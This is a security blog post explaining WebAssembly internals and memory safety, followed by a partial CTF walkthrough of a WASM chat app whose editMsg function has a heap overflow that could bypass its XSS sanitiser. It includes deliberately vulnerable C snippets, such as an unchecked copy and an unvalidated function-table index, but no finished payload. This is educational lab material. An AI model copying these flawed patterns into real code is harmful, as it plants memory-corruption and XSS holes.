---
layout: default
title: "Pwning WebAssembly: Bypassing XSS Filters in the WASM Sandbox"
description: "A deep dive into WebAssembly security, exploring how to analyze and exploit client-side XSS filters using vulnerabilities in WASM module."
og_description: "Explore WebAssembly internals and security implications in WASM Linear Memory Sandbox."
og_type: "article"
keywords: "WebAssembly, WASM, XSS, sandbox security, client-side security, binary exploitation, linear memory, web pwning, zoozoo-sec"
permalink: /blogs/PwningWasm-BreakingXssFilters/
---

<!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="{{ '/blogs/blog-page.css' | relative_url }}" />





<section id="back">
<section id="blueback" class="container">
    <div id="intro" class="challenge-section">
        <div class="section-content">
        <h3><code>Pwning WebAssembly: Bypassing XSS Filters in the WASM Sandbox</code></h3>
        <p><em>September 2025</em></p>
            <p><br>
                Lately, I’ve been trying to level up my pwn game, so I decided to dive into WebAssembly security. 
                Everyone hypes WASM as safe, sandboxed thing that makes running C/C++ in the browser “secure,” 
                but the more I played with it, the more I realized there’s a lot going on under the hood that most devs 
                don’t even think about. It’s fast, yeah, but that speed comes with complexity: weird memory models, JS glue code, 
                runtimes, and a whole new attack surface. This post is basically me dumping what I’ve been learning so far — 
                how WASM works, what it does well, and where it can be broken.
            </p>
            <p>
            <em><code>Quick Note:</code> I’m still learning and exploring WebAssembly security, So this post is a collection of my explorations and notes as I dive into WebAssembly security. If you spot mistakes, missing details, or have suggestions, I’d genuinely love your feedback — feel free to reach out to me via <a href="mailto:this.sarvesh@gmail.com">email</a>!</em>
            </p>
        </div>
    </div>
    <div id="toc" class="challenge-section">
        <div class="section-content">
            <ul>
                <li><a href="#what-is-wasm">What’s WebAssembly?</a></li>
                <li><a href="#under-the-hood">How WebAssembly Works Under the Hood</a></li>
                <li><a href="#tiered-compilation">Tiered Compilation: Liftoff and Turbofan</a></li>
                <li><a href="#memory-model">Memory Model: The Heart of the Sandbox</a></li>
                <li><a href="#js-glue">The JS Glue: WASM’s Gateway to the Outside World</a></li>
                <li><a href="#why-not-classic">Why Traditional C/C++ Exploits Don’t Work in WASM</a></li>
                <li><a href="#attack-surface">The Real Attack Surface in WASM</a></li>
                <li><a href="#rust-wasm">Rust and WASM: Memory Safety. </a></li>
                <li><a href="#CTFWebApplication">CTF Web Application - Breaking XSS! </a></li>
            </ul>
        </div>
    </div>
    <div id="what-is-wasm" class="section-content">
        <h4 class='text'>What’s WebAssembly Anyway?</h4>
        <p><br>
            WebAssembly is a low-level bytecode format that runs inside a browser’s sandboxed virtual machine. 
            Instead of hand-writing everything in JavaScript, developers can write performance-critical code in 
            <code>C</code>, <code>C++</code>, or <code>Rust</code>, compile to <code>.wasm</code>, and let the browser execute it at near-native speed.
        </p>
        <p>
            And it’s not niche — WASM powers massive real-world apps:
        </p>
        <ul>
            <li><code>Canva</code> crunching image filters in the browser.</li>
            <li><code>Figma</code> running a full design suite without a desktop client.</li>
            <li><code>AutoCAD</code> rendering CAD models online.</li>
            <li><code>Unity/Unreal</code> exporting games to the web.</li>
            <li><code>TensorFlow.js</code> accelerating machine learning inference.</li>
            <li><code>Google Earth</code> for smooth, native-like performance.</li>
        </ul>
        <p>
            So yeah, WASM isn’t some toy tech — it’s quietly powering apps millions of people touch daily. 
            And that makes it interesting for hackers: more power, more complexity, and a much bigger attack surface.
        </p>
    </div>
    <div id="under-the-hood" class="section-content">
        <h4 class='text'>How WebAssembly Works Under the Hood</h4>
        <p><br>
            If you think WASM is just <code>"run code in the browser"</code>, you’re missing the fun part. 
            Under the hood, it’s a whole mini-computer running inside your browser. 
            When you write code in C, C++, or Rust and compile it to WASM, 
            you’re essentially turning it into a tiny binary program designed to run safely and fast on any platform. 
            Think of it as a <code>virtual CPU</code> that lives inside your browser tab.
        </p>
        <p>
            Here’s what actually happens: your high-level code hits a compiler like 
            <code>Emscripten</code> or Rust’s <code>wasm32-unknown-unknown</code> target, 
            and out comes WASM bytecode — a compact, low-level binary format. 
            This bytecode isn’t tied to your machine’s CPU; it’s designed to run inside a 
            <code>sandboxed virtual machine</code>. 
            That’s why WASM is portable — the same .wasm file can run on Chrome, Firefox, 
            or Node.js with almost identical performance.
        </p>
        <p>
            The <code>V8 engine</code> (used in Chrome and Edge) starts by parsing this binary. 
            Think of it as unpacking a box full of labeled components: functions, variables, memory blocks, 
            and function tables. V8 doesn’t execute anything yet; it’s just organizing the pieces 
            in a way that makes them runnable. Below is the different parts of WebAssembly. 
        </p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/wasm-metas.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <p>
            For more in-depth concepts, read this <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Guides/Concepts" target="_blank">Documentation</a>. So at this stage, everything is defined but <code>not yet executing</code>. 
            The pieces are ready, waiting for execution to begin.
        </p>
    </div>
    <div id="tiered-compilation" class="section-content">
        <h4 class='text'>Tiered Compilation: Liftoff and Turbofan (Let's ignore Maglev for now)</h4>
        <p>
            Now the real magic begins. V8 doesn’t just interpret WASM bytecode like an old-school emulator. 
            Interpreting one instruction at a time would be too slow. Instead, V8 compiles WASM into 
            <code>native machine code</code>, instructions that your CPU can run directly. 
            But here’s the tricky part: compilation takes time. 
            The browser wants your module to start executing as soon as possible, 
            but also run fast once it’s executing. 
            To solve this, V8 uses <code>tiered compilation</code>, which balances speed and performance.
        </p>
        <ul>
            <li>
                <code>Liftoff (Baseline Compiler):</code> This is the first stage. Liftoff’s job is simple: 
                take the WASM bytecode and translate it into machine code 
                fast enough to start running immediately.
                It doesn’t do fancy optimizations; it just ensures the code works. 
                Think of it as a “good enough to run now” compiler. 
                This allows your page or app to begin execution almost instantly, 
                so users don’t notice any delay.<br>
            </li>
            <li>
                <code>Turbofan (Optimizing Compiler):</code> While Liftoff is already running your code, 
                Turbofan is quietly profiling what your program is actually doing. 
                Which functions are called most often? Which loops repeat thousands of times? 
                Turbofan takes this information and recompiles the “hot” functions with optimizations:
                <ul>
                    <li>Reordering instructions for efficiency.</li>
                    <li>Inlining small functions to avoid jumps.</li>
                    <li>Using CPU registers smartly to reduce memory access.</li>
                </ul>
            </li>
            <p>
                After a few iterations, the same function that first ran through Liftoff 
                is now executing at <code>near-native CPU speed</code>, 
                making WASM code feel almost indistinguishable from native applications.
            </p>
            <figure style="text-align: center; margin: 0;">
                <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/compilation.png' | relative_url }}" alt="snippet" class="code-screenshot" style="display: block; margin: 0 auto;" />
                <figcaption style="font-size: 0.9em; margin-top: 4px;">
                    Image from <a href="https://v8.dev/blog/liftoff#the-new-compilation-pipeline-(liftoff)" target="_blank">v8.dev's</a> blog post.
                </figcaption>
            </figure>
            <br>
            If you want to dive deeper into the WebAssembly compilation pipeline, I highly recommend reading the following V8 blog posts.
                <ul>
                    <li>
                        <a href="https://v8.dev/docs/wasm-compilation-pipeline" target="_blank">Wasm Compilation Pipeline</a>
                    </li>
                    <li>
                        <a href="https://v8.dev/blog/liftoff" target="_blank">Liftoff - Baseline Compiler</a>
                    </li>
                    <li>
                        <a href="https://github.com/thlorenz/v8-perf/blob/master/compiler.md" target="_blank">Thlorenz's post</a>
                    </li>
                </ul>
        </ul>
    </div>
    <div id="memory-model" class="section-content">
        <h4 class='text'>Memory Model: The Heart of the Sandbox</h4>
        <p>
            One of the most important concepts to understand in WebAssembly security is its memory model. 
            Unlike higher-level languages that abstract away memory management, or native applications that work directly with system memory, 
            WASM takes a very particular approach: it gives each module a single, flat, contiguous block of memory called <code>linear memory</code>.
        </p>
        <p>
            This design choice makes WASM both efficient and relatively safe — but it also defines the limits and behaviors that an attacker must consider. 
            Let’s walk through how this “sandboxed memory apartment” is structured.
        </p>
        <h6 class="sidetext">Linear Memory: The WASM Sandbox</h6>
        <p>
            At its core, linear memory is just a giant array of bytes. Imagine you started your program with:
        </p>
        <pre><code class="language-python">char memory[65536]; // 64 KB</code></pre>
        <p>
            That’s essentially what WASM gives you at the start — one continuous region of memory that your module can read from and write to. 
            When you compile C, C++, or Rust code to WASM, all variables, arrays, and data structures are mapped into this space.
        </p>
        <ul>
            <li>Unlike <code>JavaScript</code>, which dynamically allocates and garbage-collects memory behind the scenes, WASM does not automatically manage multiple heaps for you.</li>
            <li>Unlike native code, which can spread data across multiple segments (<code>heap</code>, <code>stack</code>, <code>code</code>, <code>globals</code>) in process memory, WASM consolidates all user data into this single linear memory.</li>
            <li>Every function in the module shares it. Functions don’t each get private stacks or local heaps carved out separately from the linear space. They all point into the same memory pool. This makes data sharing between functions much faster, but it also means mistakes have broader consequences.</li>
        </ul>
        <h6 class="sidetext">Apartment Analogy</h6>
        <p>Think of linear memory as a private apartment for your <code>WASM</code> module inside the browser:</p>
        <ul>
            <li>When your program loads, the browser sets aside an apartment (say, 64 KB of initial memory).</li>
            <li>Inside, you can arrange your “furniture”: arrays, strings, structs, and counters.</li>
            <li>Every function is like a roommate — they can all move things around inside the apartment, but they can’t knock down walls and mess with others outside (like the browser or system memory).</li>
        </ul>
        <p>
            This is the sandbox guarantee: your module is isolated from the world outside. No matter what bugs exist in your code, they can’t overwrite Browser's process memory Or the renderer's memory.
        </p>
        <p><code>At least, that’s what they claim. They say WASM is safe, but sandbox escapes to renderer process keep proving otherwise.</code></p>
        <h6 class="sidetext">Bugs Still Matter (Inside the Sandbox)</h6>
        <p>
            However, mistakes inside the apartment can still cause chaos. Consider this example in <code>C</code>:
        </p>
        <pre><code class="language-c">int arr[10];
arr[11] = 42; // out-of-bounds write</code></pre>
        <p>
            On a native system, this could overwrite a saved return address, change control flow, corrupt unrelated process memory, or crash the entire application.
            On WASM, <code>arr</code> can’t reach outside the sandbox. But it can corrupt another piece of data within the module’s own linear memory.
            Maybe it overrides a cryptographic key, an index into a function table, or user input buffers. That’s still dangerous — just not system-level catastrophic.
        </p>
        <h6 class="sidetext">Memory Growth and Limits</h6>
        <p>
            Linear memory isn’t infinite; it’s divided into fixed-size pages of 64 KB each. When a WASM module starts, it requests an initial number of pages (say, 1 page = 64 KB).
            As the program runs, it can explicitly request more pages if needed — for example, a game suddenly loading a massive map, or an editor opening a large file.
            But the browser enforces an upper ceiling, so runaway programs can’t consume infinite memory. This paged growth mechanism keeps memory predictable and adds another safety layer.
        </p>
        <p>
            It is also important to understand that WASM memory isn’t one big undifferentiated blob. Internally, the virtual machine separates things into different types of pages. Two primary regions are:
        </p>
        <ul>
            <li>Code Region</li>
            <li>Data Region</li>
        </ul>
        <h6 class="sidetext">Code Region</h6>
        <p>
            Code — your actual executable instructions — does not live inside linear memory. Instead, compiled functions are placed in separate, read-only code pages.
            This design prevents accidental or malicious attempts to overwrite instructions in memory.
            In traditional native programs, code and data sometimes lived in the same region (<code>writable/executable memory</code>), which is how classic code injection attacks worked. WASM blocks this by enforcing separation.
        </p>
        <p>Example:</p>
        <pre><code class="language-c">int add_numbers(int a, int b) {
    return a + b;
}</code></pre>
        <p>
            The machine instructions for <code>add_numbers</code> live in a code page. The integers <code>a</code> and <code>b</code> live in linear memory (data pages).
            While the CPU executes the function, it fetches instructions from the code page and operates on values inside linear memory.
            The key is that those two memory regions cannot overlap. You can’t store instructions in linear memory and then trick the engine into executing them.
        </p>
        <h6 class='sidetext'>Linear Memory Pages (Data Region)</h6>
        <p>
            The actual working storage of your program — arrays, structs, buffers, strings, global variables — all live in linear memory data pages.
            Every function shares this memory pool, which is both a performance advantage (fast data exchange) and a risk factor (bugs in one function spill into others).
        </p>
        <ul>
            <p>Example:</p>
            <li>In an image editor compiled to WASM, the raw pixel data from a photo lives in linear memory pages.</li>
            <li>Filter functions write their results back to buffers in the same space.</li>
            <li>Temporary states, like undo history or intermediate filter layers, also occupy linear memory.</li>
        </ul>
        <p><br>
            One buffer overflow in a function applying a Gaussian blur could corrupt unrelated data like the undo stack — creating bugs or exploitable behavior.
        </p>
        <h5 class='sidetext'>Stack and Globals (Data Regions)</h5>
        <p>
            The stack for local function variables and the global section (counters, constants shared across functions) also reside inside linear memory.
            Functions don’t get a private CPU-backed call stack like they would with native execution. Instead, local variables are mapped into memory offsets within linear memory.
            Globals are similarly layered into reserved regions for predictable access.
        </p>
        <p>
            This unified layout creates a predictable memory model. Predictability matters: it makes execution efficient, but also makes it interesting for attackers, 
            since knowing where everything lives opens possibilities for memory corruption attacks — <code>albeit bounded by the sandbox.</code>
        </p>
    </div>
    <div id="js-glue" class="section-content">
        <h4 class="text">The JS Glue: WASM’s Gateway to the Outside World</h4>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/wasm-arch.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <p>
            Up until now, we described WASM’s apartment-like memory model: it has its own private 
            linear memory, code pages, stack, and globals. But here’s the catch — WASM can’t talk to 
            the outside world directly.
        </p>
        <ul>
            <li>No direct access to the DOM.</li>
            <li>No system calls to open files.</li>
            <li>No direct networking sockets, timers, or graphics APIs.</li>
        </ul>
        <p>
            Without external bridges, a WASM module is essentially a sealed, high-performance calculator. 
            That’s where JavaScript glue code comes in.
        </p>
        <h5 class='sidetext'>What Glue Code Does</h5>
        <p>
            Think of glue code as the <em>“phone line”</em> between the WASM module and the outside browser environment:
        </p>
        <ul>
            <li>
            <code>Memory Buffers:</code> JavaScript allocates <code>ArrayBuffer</code> or 
            <code>TypedArray</code> views into WASM’s linear memory. That’s how JS can read/write raw memory 
            from the WASM sandbox. For example, letting JavaScript inspect the result of an image filter 
            implemented in WASM.
            </li>
            <li>
            <code>Imports:</code> WASM modules can import functions from JS.  
            <em>Example:</em> A WASM program might import <code>console.log</code> or 
            <code>Math.random</code> provided by JS.
            </li>
            <li>
            <code>Exports:</code> WASM can export functions that JavaScript calls, with arguments often pointing to 
            offsets inside linear memory.  
            <em>Example:</em> JS calls 
            <code>wasm.instance.exports.process(userInputPtr)</code> where <code>process</code> 
            expects to read a string starting at memory offset <code>userInputPtr</code>.
            </li>
        </ul>
        <p>
        Large frameworks like <code>Emscripten</code> or <code>Unity WebGL</code> often ship auto-generated glue JavaScript. This code handles initializing WASM memory, setting up function tables, wiring DOM events, and converting between JS types and WASM binaries, effectively acting as the orchestration layer that makes complex applications work seamlessly in the browser.
        </p>
        <h5 class='sidetext' >Example of JS Glue in Action</h5>
        <p>Suppose we compile this C function to WASM:</p>
        <pre><code class="language-c">int add(int a, int b) {
    return a + b;
}</code></pre>
        <p>
            The WASM binary just has the machine-level instructions for <code>add</code>. 
            It doesn’t know how to run in the browser. So JavaScript glue wraps it:
        </p>
        <pre><code class="language-javascript">const wasmModule = await WebAssembly.instantiateStreaming(fetch("add.wasm"));
console.log(wasmModule.instance.exports.add(5, 3)); // prints 8</code></pre>
        <p>
            Here, JavaScript fetches and instantiates the .wasm file, taking care of setting up the memory and execution environment. Once initialized, the functions exported by the WASM module can be called just like any other JavaScript function. Of course, the memory boundary still exists — while simple integers are passed directly, more complex data like strings require JavaScript to read from WASM’s linear memory at the correct offsets.
        </p>
    </div>
    <div id="why-not-classic" class="section-content">
        <h4 class="text">Why Traditional C/C++ Exploits Don’t Work in WASM</h4>
        <p><br>
            If you come from a classic binary-exploitation background, you probably think in terms of buffer overflows, 
            return-oriented programming (ROP), and arbitrary pointer manipulation. WebAssembly changes the rules. 
            Even when the code started life as C or C++, the execution model inside the browser is radically different, 
            and a lot of the old tricks simply stop working — or become much harder to pull off.
        </p>
        <p>
            <strong>First,</strong> WASM does not expose raw system pointers. In a native C/C++ program you can often tamper with pointers 
            to overwrite return addresses on the stack, chain gadgets for a ROP payload, or otherwise hijack control flow. 
            In WASM, all of the program’s memory lives inside a single <code>linear memory</code> region — a sandboxed byte array. 
            That sandbox prevents code from referencing or writing into arbitrary process memory, so you can’t simply point outside 
            the module and corrupt the process or the OS.
        </p>
        <p>
            <strong>Second,</strong> function calls are handled through indices and tables rather than raw addresses. Each function in a WASM module 
            gets an index in an internal function table. Calls are either <code>direct</code> (the index is fixed at compile time) 
            or <code>indirect</code> (the index is looked up in a table at runtime). Because control transfers are mediated by the 
            engine and checked for type/ bounds, there are no writable return addresses lying around that you can clobber to build a ROP chain.
        </p>
        <p>
            <code>TL;DR:</code> Classic memory exploits like overflowing a return address don’t work in WASM. Attackers focus on logic bugs in linear memory, unsafe function table use, or insecure JS↔WASM interactions to cause leaks or escalate behavior—exploitable, but with a different mindset and techniques.
        </p>
    </div>
    <div id="attack-surface" class="section-content">
        <h4 class="text">The Real Attack Surface in WASM</h4>
        <!-- Linear Memory Corruption -->
        <h5 class='sidetext'>Linear Memory Corruption</h5>
        <p>
            Even though WASM is sandboxed, linear memory is still vulnerable to bugs from unsafe languages like C or C++.
            Classic memory issues include buffer overflows, use-after-free, and integer overflows. These flaws don’t let
            you execute code outside the sandbox but can corrupt data inside the module, altering its behavior.
        </p>
        <pre><code class="language-c">char buf[10];
void unsafe(char *input) {
    for(int i=0; i&lt;strlen(input); i++) {
        buf[i] = input[i]; // buffer overflow if input > 10
    }
}</code></pre>
        <p>
            In WASM, this overflow won’t overwrite CPU stack or code pages, but it can overwrite other variables 
            in linear memory, leading to unexpected behavior.
        </p>
        <!-- Function Table Abuse -->
        <h5 class='sidetext'>Function Table Abuse (Indirect Calls)</h5>
        <p>
            WASM uses function tables for indirect calls. If indices are not validated, attackers might call unintended 
            functions or manipulate logic through invalid calls. WASM enforces type safety, but logic bugs are still possible.
        </p>
        <pre><code class="language-c">Action actions[2] = {add, sub};
int do_action(int index, int a, int b) {
    return actions[index](a, b); // unsafe if index unchecked
}</code></pre>
        <!-- JS Glue Interaction -->
        <h5 class='sidetext'>JS Glue and Host Environment Interaction</h5>
        <p>
            WASM relies on JavaScript for DOM, networking, and system calls, which creates another attack surface. 
            Unsafe exports/imports, type mismatches, or memory leaks can expose sensitive data or corrupt memory.
        </p>
        <pre><code class="language-javascript">const wasm = await WebAssembly.instantiateStreaming(fetch("module.wasm"), {
    env: { log: console.log }
});
// JS passes user input to WASM
wasm.instance.exports.process(userInput);</code></pre>
        <!-- Dynamic Module Loading -->
        <h5 class='sidetext'>Dynamic Module Loading</h5>
        <p>
            WASM supports dynamic loading, where one module can call another. Without validating function indices, 
            table sizes, and memory bounds, attackers may exploit imported modules or corrupt memory across boundaries.
        </p>
    </div>
   <div id="rust-wasm" class="section-content">
        <h4 class="text">Rust and WASM: Memory Safety, But Not a Free Pass</h4>
        <p>
            One of the biggest draws of WebAssembly is that you can compile high-performance languages like 
            C, C++, and Rust to run in the browser. With C/C++, the security story is complicated: classic 
            memory issues like buffer overflows, use-after-free, or integer overflows can still occur 
            inside linear memory, even though the module is sandboxed. These are the kinds of bugs 
            traditional binary exploitation loves.
        </p>
        <p>
            Rust, on the other hand, changes the rules fundamentally. Rust’s compiler enforces strict 
            memory safety at compile time.  
            <br><br>
            Even though Rust prevents memory corruption, WASM security issues still exist, because not all 
            vulnerabilities are about memory:
        </p>
        <ul>
            <li>
            <code>Logic Bugs Inside Linear Memory:</code> Rust prevents overflows, but if your program 
            miscalculates an index or ignores panics, attackers can still manipulate behavior.
            </li>
            <li>
            <code>Function Table / Indirect Call Abuse:</code> Rust won’t stop attackers from 
            misusing exposed indirect calls if indices aren’t validated.
            </li>
            <li>
            <code>JS Glue / Host Environment Exploits:</code> Malicious JavaScript inputs or glue code 
            errors can still trigger bugs inside WASM.
            </li>
            <li>
            <code>Side-channel Attacks:</code> Rust ensures memory safety, but timing attacks, cache 
            attacks, and other side-channels are still possible, especially in cryptographic modules.
            </li>
        </ul>
        <p>
            In other words, Rust eliminates low-level memory exploits, but high-level logic and 
            interaction bugs remain. Security in WASM shifts from “corrupt memory and hijack execution” 
            to “manipulate module behavior through inputs and exposed interfaces.”
        </p>
    </div>
    <div id="CTFWebApplication" class="section-content">
        <h4 class='text'>CTF Web Application - Breaking XSS!</h4>
        <p>
        To wrap up this deep dive into WebAssembly security, let’s look at a vulnerable web application challenge from <code>Pentathon CTF 2025, called "chaat"</code>. This challenge demonstrates how a seemingly safe WASM app can still be exploited due to logic flaws and insecure data handling to drop a XSS payload. You can download the vulnerable application files <a href="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/wasm_vulnerable_app.tar.gz' | relative_url }}">here</a> and try it out yourself.
        </p>
        <p>
        The CTF challenge is built like a typical single-page web app running a WASM module compiled from C. The application takes user input, processes it using WebAssembly logic, and renders output dynamically in the DOM.
        </p>
         <p>First, let’s see what we’re dealing with. The project is a simple Node.js app with a WASM backend powering its chat functionality:</p>
        <ul>
            <li><code>app.js</code> – Entry point for the Node app, exposing two endpoints (<code>/</code> and <code>/bot</code>) on port 3000.</li>
            <li><code>bot.js</code> – Likely where the “magic” happens (CTF flag logic lives here).</li>
            <li><code>module.c</code> – The C source for the WebAssembly module, compiled into a <code>.wasm</code> binary in <code>static/</code>.</li>
            <li><code>Frontend Files</code> (<code>static/</code>) – Contains <code>index.html</code>, <code>main.js</code>, <code>script.js</code>, <code>module.js</code> (Emscripten glue), and the compiled <code>.wasm</code>.</li>
        </ul>
        <p>So yeah, this is a Node app serving a WASM-powered chat interface.</p>
        <h5 class='sidetext'>First Look: Running the App</h5>
        <p>
            Spinning it up locally, you get a pretty clean chat app UI. There’s a text box, a “send” button, and a stream of random bot replies that make it feel like a lightweight messaging app. It’s simple, but something feels off — those bot replies are either being generated client-side or the backend is feeding them. Either way, the frontend JavaScript is clearly doing a lot of heavy lifting.
            <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        </p>
        <h5 class='sidetext'>Frontend Overview</h5>
        <p>
            Looking at <code>index.html</code> is minimal, A simple nav bar, and a container for chat messages. The heavy lifting isn’t in HTML; it’s all JavaScript-driven!
        </p>
        <ul>
            <li><code>script.js</code> is just DOM control glue — nothing serious there.</li>
            <li><code>module.js</code> is classic Emscripten-generated glue code. This is where the WASM module gets initialized and exposed to JavaScript. This is the so-called <em>“JavaScript Glue Code”</em> we discussed earlier.</li>
            <li><code>main.js</code> is where all the real logic lives, and this is where things get interesting.</li>
        </ul>
        <h5 class='sidetext'>Main.js: WASM ↔ JavaScript</h5>
        <p>Here’s where the app really starts showing its architecture. The WASM module is dynamically loaded and its functions are exposed into JavaScript through <code>Module.cwrap</code>:</p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code1.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <p>So this tells us:</p>
            <ul>
                <li>There’s a WASM function for everything: adding, deleting, editing messages, and rendering the chat UI (<code>populateMsgHTML</code>).</li>
                <li>Two JavaScript callbacks are registered (<code>populateMsgs</code> and <code>deletemsg</code>) so the WASM module can call back into JavaScript.</li>
                <li><code>Module.cwrap</code> is key: it bridges C/WASM functions into JavaScript, handling argument and return type conversions for you.</li>
                <li>This pattern is  Emscripten glue: the WASM module owns the chat data model, while JavaScript is primarily a rendering and control layer.</li>
            </ul>
        <h5 class='sidetext'>Chat Logic: State Management</h5>
        <p>The messages aren’t just stored in memory; they’re serialized into the URL through the <code>s query parameter</code></p>
        <pre><code class="language-javascript">ReportUrl.href = `${window.location.origin}?s=${btoa(JSON.stringify(saved))}`;
//Found this snippet in main.js</code></pre>
        <p>Every message or action (add, edit, delete) gets pushed into a <code>saved</code> array, Base64-encoded, and stuck into the URL. When you reload the page, main() reads that query string, decodes it, and rebuilds the entire chat state.</p>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code2.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <p>So, the entire chat history is user-controlled. You can literally forge a URL with fake chat messages, reload the page, and it’ll render as if they were real.</p>
        <code>Understanding the WASM Module: module.wasm</code>
        <p>
            The <code>module.c</code> file is the heart of this app. It compiles to WebAssembly and holds all the chat state and message logic. 
            To understand the functions, we need to start with the data structures it defines:
        </p>
        <h5 class='sidetext'>Core Data Structures</h5>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code3.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <ul>
            <li><strong>msg</strong> — Represents a single chat message:
            <ul>
                <li><code>msg_data</code>: Pointer to dynamically allocated memory holding the actual text.</li>
                <li><code>msg_data_len</code>: The length of the message (after sanitization).</li>
                <li><code>msg_time</code>: A timestamp (Unix epoch) indicating when it was created.</li>
                <li><code>msg_status</code>: Status flags (e.g., edited or not).</li>
            </ul>
            </li>
            <li><strong>stuff</strong> — This is the chat application state, essentially a dynamic array of msg structs:
            <ul>
                <li><code>mess</code>: Pointer to a heap-allocated array of messages.</li>
                <li><code>size</code>: Number of messages currently stored.</li>
                <li><code>capacity</code>: Maximum number of messages allocated (grows dynamically).</li>
            </ul>
            </li>
            <li>All chat data is centralized in a single global variable <code>s</code>.</li>
        </ul>
        <h5 class='sidetext'>Memory Initialization: initialize()</h5>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code4.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <p>
            This function allocates space for 10 messages initially and sets up memory in WASM’s linear heap.
            It ensures all message storage is dynamically allocated inside WASM.
        </p>
        <h5 class='sidetext'>Sanitization: sanitize()</h5>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code5.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <p>
            Before storing messages, <code>sanitize()</code> replaces HTML characters with safe entities.
            This makes bypassing XSS tricky, as sanitization happens at the WASM layer before rendering.
        </p>
        <h5 class='sidetext'>Adding Messages: addMsg()</h5>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code6.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <ul>
            <li>Rejects messages longer than 100 bytes.</li>
            <li>Sanitizes input content and clears the original buffer for safety.</li>
            <li>Stores sanitized text, timestamp, and status in a <code>msg</code> struct.</li>
            <li>Dynamically expands the array if needed (capacity doubles like <code>std::vector</code>).</li>
        </ul>
        <h5 class='sidetext'>Editing Messages: editMsg()</h5>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code9.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <ul>
            <li>Bounds-checks the index and sanitizes new content.</li>
            <li>Copies sanitized data in place, updates timestamp, and marks the message as edited.</li>
            <li>Does not reallocate if new content is longer, which can create a memory corruption vector.</li>
        </ul>
        <h5 class='sidetext'>Deleting Messages: deleteMsg()</h5>
        <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code7.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        <ul>
            <li>Frees the message’s buffer and shifts later messages down.</li>
            <li>Keeps the array compact, which means message IDs change after deletion.</li>
            <li>Calls back into JavaScript to update the UI dynamically.</li>
        </ul>
        <h5 class='sidetext'>Rendering Messages: populateMsgHTML()</h5>
        <ul>
            <li>Wraps each sanitized message in HTML (<code>&lt;article&gt;&lt;p&gt;</code> tags).
            <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/code8.png' | relative_url }}" alt="snippet" class="code-screenshot" />
            </li>
            <li>Uses a JavaScript callback to inject these messages into the DOM.</li>
            <li>This is the final layer of XSS protection before rendering content to the user.</li>
        </ul>
        <h5 class='sidetext'>Breaking Down Main.js</h5>
        <p>
            The rest of <code>main.js</code> focuses on state handling and DOM updates. Here's what it does:
        </p>
        <ul>
            <li>
            Defines helper functions like <code>messagesToHTML()</code> to turn message objects into HTML blocks for rendering.
            </li>
            <li>
            Uses <code>rendermsgs()</code> to refresh the chat UI.
            </li>
            <li>
            Sets up event bindings for editing or deleting messages with SweetAlert modals.
            </li>
            <li>
            Initializes everything in the <code>main()</code> function, which:
            <ul>
                <li>Reads the <code>s</code> query parameter from the URL.</li>
                <li>Decodes and applies actions (add, edit, delete) by calling corresponding WASM functions.</li>
                <li>Re-renders the chat UI after updates.</li>
            </ul>
            </li>
            <li>
            Updates the URL dynamically (<code>report-url</code>) so users can copy a link containing their chat history.
            </li>
            <li>
            Acts as a controller layer: serializing/deserializing state, connecting DOM events to WASM exports, and syncing chat data between memory and the UI.
            </li>
        </ul>
        <h5 class='sidetext'>Diving Into the Vulnerability</h5>
        <p>
            Okay, that’s enough intro to the challenge—let’s jump straight into the vulnerability. Any pwner would notice this quickly, 
            but exploiting it is a bit tricky if you’re not used to debugging WASM internals (I struggled with that myself).
        </p>
        <p>
            The bug is a <strong>heap overflow</strong> in the <code>editMsg</code> function. While addMsg validates the length of input before allocating memory and storing it, editMsg skips any checks. It directly calls <code>memcpy</code> to copy user input into the existing message buffer, which means we can write past the allocated chunk.
        </p>
        <p>
            Let’s see this in action:
        </p>
        <ol>
            <li>
            Create two messages:<br>
            <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/vuln.png' | relative_url }}" alt="Two messages screenshot" class="code-screenshot" />
            </li>
            <li>
            Edit the first message with a larger payload. The second message gets overwritten:<br>
            <img src="{{ '/blogs/PwningWasm-BreakingXssFilters/assets/vuln1.png' | relative_url }}" alt="Overflowed message screenshot" class="code-screenshot" />
            </li>
        </ol>
        <p>
            The vulnerability is confirmed. But exploiting this isn’t like traditional heap exploits on ELF binaries—there’s no metadata 
            corruption or <code>tcache</code> tricks. In WebAssembly, memory is just a flat, contiguous <code>linear memory</code> block. 
            That changes how we approach the bug. We’ll need to understand exactly how data is laid out in WASM’s linear memory 
            before planning an exploit.
        </p>
